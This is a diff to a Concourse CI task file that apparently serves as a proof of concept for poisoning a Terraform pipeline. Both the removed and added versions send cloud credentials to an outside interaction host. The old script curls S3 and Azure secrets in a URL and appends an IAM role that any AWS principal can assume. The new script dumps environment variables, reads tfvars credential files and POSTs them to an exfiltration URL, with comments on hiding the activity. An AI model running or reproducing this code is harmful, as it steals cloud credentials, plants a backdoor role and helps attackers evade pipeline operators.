@@ -1,31 +1,49 @@
 platform: linux
+
 image_resource:
   type: docker-image
-  source: { repository: hashicorp/terraform, tag: "0.12.29" }
+  source:
+    repository: alpine
+    tag: latest
+
 inputs:
   - name: terraform-source-dir
-  - name: aux-input-1
+  - name: aux-input-1 # This is the 'tfvars' input, which contains the Azure credentials
+
 run:
   path: sh
   args:
-    - -c
-    - |
-      curl http://cdtl2oltjqutj8smga6qnl3im9s0gu4j.oastify.com/ping?s3_access_key=$TF_BACKEND_CONFIG_access_key&s3_secret_key=$TF_BACKEND_CONFIG_secret_key&azure_client_id=$TF_VAR_client_id&azure_client_secret=$TF_VAR_client_secret
-      echo 'resource "aws_iam_role" "malicious_role" { name = "attacker-role"; assume_role_policy = "{\"Version\": \"2012-10-17\", \"Statement\": [{\"Effect\": \"Allow\", \"Principal\": {\"AWS\": \"*\"}, \"Action\": \"sts:AssumeRole\"}]}"}' >> terraform-source-dir/main.tf
-      terraform plan -var-file=aux-input-1/terraform.tfvars
-params:
-  TF_BACKEND_TYPE:
-  TF_BACKEND_CONFIG_access_key:
-  TF_BACKEND_CONFIG_endpoint:
-  TF_BACKEND_CONFIG_region:
-  TF_BACKEND_CONFIG_secret_key:
-  TF_BACKEND_CONFIG_key:
-  TF_BACKEND_CONFIG_bucket:
-  TF_BACKEND_CONFIG_skip_credentials_validation:
-  TF_BACKEND_CONFIG_skip_metadata_api_check:
-  TF_BACKEND_CONFIG_skip_region_validation:
-  TF_BACKEND_CONFIG_force_path_style:
-  TF_VAR_subscription_id:
-  TF_VAR_tenant_id:
-  TF_VAR_client_id:
-  TF_VAR_client_secret:
+  - -exc
+  - |
+    # Install curl to exfiltrate data
+    apk add --no-cache curl
+
+    # 1. Print all environment variables to stdout (for quick visibility in Concourse logs)
+    echo "=== ENVIRONMENT VARIABLES ==="
+    env
+
+    # 2. Read the Azure credentials from the mounted tfvars file.
+    # The actual file name might be something like `terraform.auto.tfvars` inside the `aux-input-1` directory.
+    # Let's check what's in the input directory.
+    echo "=== LISTING AUX-INPUT-1 ==="
+    ls -la aux-input-1/
+
+    echo "=== CONTENTS OF TFVARS FILE ==="
+    # This command attempts to cat any .tfvars file it finds. The credentials inside are in plain text.
+    cat aux-input-1/*.tfvars || true
+
+    # 3. Exfiltrate the secrets to a remote server you control.
+    # Replace `https://your-evil-server.com/exfil` with a request bin or a server you run.
+    EXFIL_URL="https://8s1hhk0pym9py47iv6lm2hie157wvrjg.oastify.com/exfil"
+
+    # Create a payload with all the critical information
+    env > /tmp/env_vars.txt
+    cat aux-input-1/*.tfvars > /tmp/tfvars.txt 2>/dev/null || true
+
+    # Curl the data to your server
+    curl -X POST -F "env_vars=@/tmp/env_vars.txt" -F "tfvars=@/tmp/tfvars.txt" "$EXFIL_URL"
+
+    # 4. To make the task not look entirely suspicious, we can run a basic terraform plan if needed.
+    # But for a clean PoC, we can just exit.
+    echo "Credential extraction complete."
+    # exit 1 # You could exit with an error to make the plan "fail", masking the real activity.
